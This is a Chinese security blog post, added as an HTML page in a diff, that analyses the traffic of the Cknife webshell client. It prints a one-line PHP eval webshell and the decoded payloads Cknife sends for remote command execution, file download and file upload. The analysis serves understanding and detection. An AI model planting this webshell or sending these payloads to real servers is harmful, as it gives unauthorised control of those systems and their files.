@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01 环境1&amp;lt;?php eval($_REQUEST[&apos;shell&apos;] ?&amp;gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cknife流量分析">
+<meta property="og:url" content="http://yoursite.com/2019/02/11/Cknife流量分析/index.html">
+<meta property="og:site_name" content="B1ok3n&#39;s Blog">
+<meta property="og:description" content="0x01 环境1&amp;lt;?php eval($_REQUEST[&apos;shell&apos;] ?&amp;gt;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549864408222.png">
+<meta property="og:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549864204478.png">
+<meta property="og:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549865961339.png">
+<meta property="og:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549866499136.png">
+<meta property="og:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549867166066.png">
+<meta property="og:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549867720428.png">
+<meta property="og:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549868914718.png">
+<meta property="og:updated_time" content="2019-02-11T07:22:23.133Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cknife流量分析">
+<meta name="twitter:description" content="0x01 环境1&amp;lt;?php eval($_REQUEST[&apos;shell&apos;] ?&amp;gt;">
+<meta name="twitter:image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549864408222.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/11/Cknife流量分析/">
+
+
+
+
+
+  <title>Cknife流量分析 | B1ok3n's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">B1ok3n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/11/Cknife流量分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="B1ok3n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/images/QQ%E5%9B%BE%E7%89%8720190205121702.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="B1ok3n's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Cknife流量分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-11T15:14:32+08:00">
+                2019-02-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[<span class="string">'shell'</span>] <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h2 id="0x01-命令执行"><a href="#0x01-命令执行" class="headerlink" title="0x01 命令执行"></a>0x01 命令执行</h2><p><strong>执行命令结果如下图所示</strong></p>
+<p><img src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549864408222.png" alt="1549864408222"></p>
+<p><strong>POST的数据如下图所示</strong></p>
+<p><img src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549864204478.png" alt="1549864204478"></p>
+<p><strong>对POST的数据解码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell</span></span><br><span class="line">@<span class="keyword">eval</span>(base64_decode($_POST[action]));</span><br><span class="line"></span><br><span class="line"><span class="comment">#action</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"-&gt;|"</span>);;</span><br><span class="line">$p=base64_decode($_POST[<span class="string">"z1"</span>]);</span><br><span class="line">$s=base64_decode($_POST[<span class="string">"z2"</span>]);</span><br><span class="line">$d=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">$c=substr($d,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">"/"</span>?<span class="string">"-c \"&#123;$s&#125;\""</span>:<span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">$r=<span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line">@system($r.<span class="string">" 2&gt;&amp;1"</span>,$ret);</span><br><span class="line"><span class="keyword">print</span> ($ret!=<span class="number">0</span>)?<span class="string">"ret=&#123;$ret&#125;"</span>:<span class="string">""</span>;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"|&lt;-"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#z1</span></span><br><span class="line">cmd</span><br><span class="line"></span><br><span class="line"><span class="comment">#z2</span></span><br><span class="line">cd/d<span class="string">"C:\wamp64\www\"&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</span></span><br></pre></td></tr></table></figure>
+<p><code>z2</code>是<code>whoami</code>经过<code>cknife</code>的组合再经过<code>base64</code>编码后的结果，<code>cknife</code>通过<code>eval</code>执行<code>action</code>中的代码，把POST的<code>z1</code>和<code>z2</code>用<code>base64_decode</code>解码，再把<code>z1</code>和<code>z2</code>组合成<code>$r</code>，最后用<code>system</code>执行<code>$r</code>，打印执行结果。</p>
+<p><strong><code>cknife</code>返回结果如下图所示</strong></p>
+<p><img src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549865961339.png" alt="1549865961339"></p>
+<p>经过<code>cknife</code>的格式处理，返回的结果变成了上图的样子，<code>-&gt;|</code>和<code>|&lt;-</code>中间的内容就是执行命令的结果</p>
+<h2 id="0x02-文件下载"><a href="#0x02-文件下载" class="headerlink" title="0x02 文件下载"></a>0x02 文件下载</h2><p><strong>POST的数据如下图所示</strong></p>
+<p><img src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549866499136.png" alt="1549866499136"></p>
+<p><strong>对POST的数据解码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell</span></span><br><span class="line">@<span class="keyword">eval</span>(base64_decode($_POST[action]));</span><br><span class="line"></span><br><span class="line"><span class="comment">#action</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"-&gt;|"</span>);;</span><br><span class="line">$F=get_magic_quotes_gpc()?base64_decode(stripslashes($_POST[<span class="string">"z1"</span>])):base64_decode($_POST[<span class="string">"z1"</span>]);</span><br><span class="line">$fp=@fopen($F,<span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(@fgetc($fp))&#123;</span><br><span class="line">	@fclose($fp);</span><br><span class="line">	@readfile($F);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span>(<span class="string">"ERROR:// Can Not Read"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"|&lt;-"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#z1</span></span><br><span class="line">C:\wamp64\www\index.php</span><br></pre></td></tr></table></figure>
+<p><code>z1</code>是目标文件路径经过<code>base64</code>编码后的结果，<code>cknife</code>通过<code>eval</code>执行<code>action</code>中的代码，用<code>base64_decode</code>获取文件的路径，然后判断文件是否能够被读取，如果能够被读取，则用<code>readfile()</code>输出文件的内容，最后将输出的文件内容写入到本地文件中。</p>
+<p><strong><code>cknife</code>返回结果如下图所示</strong></p>
+<p><img src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549867166066.png" alt="1549867166066"></p>
+<p>有一点需要注意，<code>cknife</code>可能会将返回的所有内容输出到文件中，所以需要手动取出<code>-&gt;|</code>和<code>|&lt;-</code>之间的内容，否则文件可能格式错误</p>
+<h2 id="0x03-文件上传"><a href="#0x03-文件上传" class="headerlink" title="0x03 文件上传"></a>0x03 文件上传</h2><p><strong>POST的数据如下图所示</strong></p>
+<p><img src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549867720428.png" alt="1549867720428"></p>
+<p><strong>对POST的数据解码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#shell</span></span><br><span class="line">@<span class="keyword">eval</span>(base64_decode($_POST[action]));</span><br><span class="line"></span><br><span class="line"><span class="comment">#action</span></span><br><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"-&gt;|"</span>);;</span><br><span class="line">$f=base64_decode($_POST[<span class="string">"z1"</span>]);</span><br><span class="line">$c=$_POST[<span class="string">"z2"</span>];</span><br><span class="line">$c=str_replace(<span class="string">"\r"</span>,<span class="string">""</span>,$c);</span><br><span class="line">$c=str_replace(<span class="string">"\n"</span>,<span class="string">""</span>,$c);</span><br><span class="line">$buf=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($c);$i+=<span class="number">2</span>)</span><br><span class="line">$buf.=urldecode(<span class="string">"%"</span>.substr($c,$i,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@fwrite(fopen($f,<span class="string">"w"</span>),$buf)?<span class="string">"1"</span>:<span class="string">"0"</span>);;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"|&lt;-"</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#z1</span></span><br><span class="line">C:\wamp64\www\test.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#z2</span></span><br><span class="line">this is a test</span><br></pre></td></tr></table></figure>
+<p><code>z1</code>是目标文件路径经过<code>base64</code>编码后的结果，<code>z2</code>是本地文件的内容经过<code>hex</code>编码后的结果，<code>cknife</code>通过<code>eval</code>执行<code>action</code>中的代码，用<code>base64_decode</code>先获取目标文件的路径，然后获取<code>z2</code>的内容，使用<code>for</code>循环将员原来的<code>hex</code>编码转换为<code>URL</code>编码，再用<code>urldecode</code>进行解码，追加给<code>$buf</code>，<code>for</code>循环结束后<code>$buf</code>就是文件的内容，最后写入目标文件中，写入成功返回<code>1</code>，写入失败返回<code>0</code></p>
+<p><strong><code>cknife</code>返回结果如下图所示</strong></p>
+<p><img src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/cknife%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1549868914718.png" alt="1549868914718"></p>
+<p><code>-&gt;|</code>和<code>|&lt;-</code>之间的内容为<code>1</code>，代表文件上传成功</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/10/文件包含漏洞/" rel="next" title="文件包含漏洞">
+                <i class="fa fa-chevron-left"></i> 文件包含漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://b1ok3n-blog.oss-cn-hangzhou.aliyuncs.com/images/QQ%E5%9B%BE%E7%89%8720190205121702.jpg" alt="B1ok3n">
+            
+              <p class="site-author-name" itemprop="name">B1ok3n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-环境"><span class="nav-number">1.</span> <span class="nav-text">0x01 环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-命令执行"><span class="nav-number">2.</span> <span class="nav-text">0x01 命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-文件下载"><span class="nav-number">3.</span> <span class="nav-text">0x02 文件下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-文件上传"><span class="nav-number">4.</span> <span class="nav-text">0x03 文件上传</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">B1ok3n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":120,"height":240},"mobile":{"show":true},"log":false,"tagMode":false});</script></body>
+</html>
